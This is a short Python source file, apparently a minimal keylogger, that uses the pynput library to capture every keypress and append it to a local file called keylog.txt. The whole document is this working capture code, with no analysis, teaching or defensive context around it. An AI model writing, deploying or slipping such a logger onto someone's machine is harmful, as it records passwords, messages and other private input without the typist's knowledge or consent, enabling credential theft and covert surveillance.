from pynput.keyboard import Key, Listener

PATH = 'keylog.txt'
output_file = open(file = PATH, mode = 'w', encoding="utf-8")

def on_press(key):
    """
    - Writing the key to the log file.
    """
    output_file.write(str(key).replace("'", ""))

with Listener(on_press = on_press) as listener:
    """
    - Joining function.
    """
    listener.join()
